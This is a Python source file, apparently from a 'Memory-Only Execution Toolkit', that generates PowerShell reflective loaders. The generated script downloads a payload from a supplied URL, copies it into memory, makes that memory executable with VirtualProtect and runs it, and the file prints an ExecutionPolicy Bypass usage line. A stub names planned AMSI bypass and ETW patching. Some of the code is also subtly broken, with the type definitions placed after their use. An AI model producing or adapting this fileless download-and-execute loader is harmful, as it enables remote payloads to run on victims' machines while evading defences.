"""
PowerShell Reflective Loader Generator
Generates PowerShell scripts for reflective loading
"""


class PowerShellGenerator:
    """
    PowerShell Reflective Loader Generator
    
    Generates PowerShell scripts that load and execute payloads in memory
    """
    
    def generate(self, payload_url, output_file):
        """
        Generate PowerShell reflective loader script
        
        Args:
            payload_url (str): URL to download payload from
            output_file (str): Output PowerShell script path
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            script = self._generate_script(payload_url)
            
            with open(output_file, 'w') as f:
                f.write(script)
            
            print(f"[+] PowerShell reflective loader created: {output_file}")
            print(f"[+] Usage: powershell.exe -ExecutionPolicy Bypass -File {output_file}")
            
            return True
        
        except Exception as e:
            print(f"[!] Failed to generate PowerShell script: {e}")
            return False
    
    def _generate_script(self, payload_url):
        """
        Generate PowerShell script content
        
        Args:
            payload_url (str): Payload URL
            
        Returns:
            str: PowerShell script content
        """
        return f'''# PowerShell Reflective Loader
# Executes payload entirely in memory
# Generated by Memory-Only Execution Toolkit

# Payload URL
$payloadUrl = "{payload_url}"

Write-Host "[+] PowerShell Reflective Loader"
Write-Host "[+] Downloading payload from: $payloadUrl"

try {{
    # Download payload to memory (never touches disk)
    $webClient = New-Object System.Net.WebClient
    $payloadData = $webClient.DownloadData($payloadUrl)
    
    Write-Host "[+] Payload size: $($payloadData.Length) bytes"
    Write-Host "[+] Allocating executable memory..."
    
    # Allocate executable memory
    $execMemory = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($payloadData.Length)
    
    Write-Host "[+] Allocated at: 0x$($execMemory.ToString('X'))"
    Write-Host "[+] Copying payload to memory..."
    
    # Copy payload to allocated memory
    [System.Runtime.InteropServices.Marshal]::Copy($payloadData, 0, $execMemory, $payloadData.Length)
    
    Write-Host "[+] Setting memory permissions..."
    
    # Change memory protection to executable
    $oldProtect = 0
    [Win32.Kernel32]::VirtualProtect($execMemory, [uint32]$payloadData.Length, 0x40, [ref]$oldProtect) | Out-Null
    
    Write-Host "[+] Executing payload from memory..."
    
    # Create delegate and execute
    $delegateType = [Func[IntPtr]]
    $executeDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($execMemory, $delegateType)
    $result = $executeDelegate.Invoke()
    
    Write-Host "[+] Payload executed successfully"
    Write-Host "[+] No disk artifacts created"
    
}} catch {{
    Write-Host "[!] Execution failed: $_"
    Write-Host "[!] Error details: $($_.Exception.Message)"
}}

# Add required Win32 API definitions
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {{
    public class Kernel32 {{
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            ref uint lpflOldProtect
        );
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
        );
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(
            IntPtr lpAddress,
            uint dwSize,
            uint dwFreeType
        );
    }}
}}
"@

Write-Host ""
Write-Host "[*] Loader complete"
'''
    
    def generate_advanced(self, payload_url, output_file, options=None):
        """
        Generate advanced PowerShell script with additional options
        
        Args:
            payload_url (str): Payload URL
            output_file (str): Output file path
            options (dict): Additional options
            
        Returns:
            bool: True if successful
        """
        # Future enhancement: Add AMSI bypass, ETW patching, etc.
        print(f"[!] Advanced generation not yet implemented")
        return self.generate(payload_url, output_file)